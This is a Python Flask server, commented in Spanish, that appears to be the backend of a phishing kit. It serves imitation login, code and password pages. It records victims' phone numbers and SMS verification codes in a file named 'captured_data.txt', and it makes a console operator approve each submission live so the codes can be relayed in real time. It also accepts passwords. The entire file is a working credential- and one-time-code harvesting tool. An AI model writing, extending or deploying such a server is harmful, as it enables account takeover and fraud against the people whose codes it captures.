from flask import Flask, request, jsonify, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)

# Configuración
app.config['STATIC_FOLDER'] = 'static'
DATA_FILE = 'captured_data.txt'

def log_data(data_type, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {data_type}: {data}\n"
    with open(DATA_FILE, 'a', encoding='utf-8') as f:
        f.write(entry)
    print(entry.strip())

# Endpoints para servir archivos
@app.route('/')
def serve_login():
    return send_from_directory('.', 'login.html')

@app.route('/code.html')
def serve_code():
    return send_from_directory('.', 'code.html')

@app.route('/passwd.html')
def serve_passwd():
    return send_from_directory('.', 'passwd.html')

@app.route('/loginSuccess.html')
def serve_success():
    return send_from_directory('.', 'loginSuccess.html')

@app.route('/static/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.config['STATIC_FOLDER'], filename)

# Endpoint para reset
@app.route('/reset', methods=['GET'])
def reset():
    return """
    <script>
        localStorage.clear();
        alert("Sistema reseteado. Serás redirigido.");
        window.location.href = "/";
    </script>
    """

# Endpoint para verificar número móvil
@app.route('/getCode', methods=['POST'])
def get_code():
    mobile = request.form.get('mobile', '')
    uuid = request.form.get('uuid', '')
    
    log_data("SOLICITUD DE CÓDIGO", f"Número: {mobile} | UUID: {uuid}")

    # Preguntar por consola si aprobar el número
    user_input = input(f"¿Aprobar número {mobile}? (Escribe 'ok' para continuar): ").strip().lower()

    if user_input == 'ok':
        response_data = {
            "code": "10000",
            "msg": "Success",
            "data": {
                "codeHash": f"fake-hash-{os.urandom(4).hex()}",
                "uuid": f"fake-uuid-{os.urandom(4).hex()}"
            }
        }
        log_data("NÚMERO APROBADO", f"Redirigiendo a code.html")
    else:
        response_data = {
            "code": "99999",
            "msg": "Número no aprobado"
        }
        log_data("NÚMERO RECHAZADO", f"Número {mobile} no fue aprobado")

    response = jsonify(response_data)
    response.headers['1b8eb00455431420'] = "fake-token-1"
    return response

# Endpoint para verificar código
@app.route('/checkCode', methods=['POST'])
def check_code():
    code = request.form.get('code', '')
    mobile = request.form.get('mobile', '')
    uuid = request.form.get('uuid', '')
    code_hash = request.form.get('codeHash', '')

    log_data("VERIFICACIÓN DE CÓDIGO", f"Código: {code} | Teléfono: {mobile}")

    # Preguntar por consola si aprobar el código
    user_input = input(f"¿Aprobar código {code} para {mobile}? (Escribe 'ok' para aprobar): ").strip().lower()

    if user_input == 'ok':
        response_data = {
            "code": "10000",
            "msg": "Success",
            "data": {
                "url": "http://localhost:5300/loginSuccess.html"
            }
        }
        log_data("CÓDIGO APROBADO", f"Redirigiendo a loginSuccess.html")
    else:
        response_data = {
            "code": "666",
            "msg": "Código incorrecto"
        }
        log_data("CÓDIGO RECHAZADO", f"Código {code} no fue aprobado")

    response = jsonify(response_data)
    response.headers['90d884ffdcad44417bb098'] = "fake-token-2"
    return response

# Endpoint para contraseña
@app.route('/submitPassword', methods=['POST'])
def submit_password():
    password = request.form.get('password', '')
    mobile = request.form.get('mobile', '')
    
    log_data("CONTRASEÑA RECIBIDA", f"Para: {mobile}")
    
    return jsonify({
        "code": "10000",
        "msg": "Success"
    })

if __name__ == '__main__':
    if not os.path.exists(DATA_FILE):
        open(DATA_FILE, 'w').close()
    
    if not os.path.exists('static'):
        os.makedirs('static')
        os.makedirs('static/img')
        os.makedirs('static/plugins')
    
    print("\nServidor de verificación interactivo listo:")
    print("• Accede a http://localhost:5300")
    print("• Usa /reset para limpiar el estado")
    print("• El servidor pedirá confirmación para número y código\n")
    app.run(host='0.0.0.0', port=5300, debug=False)
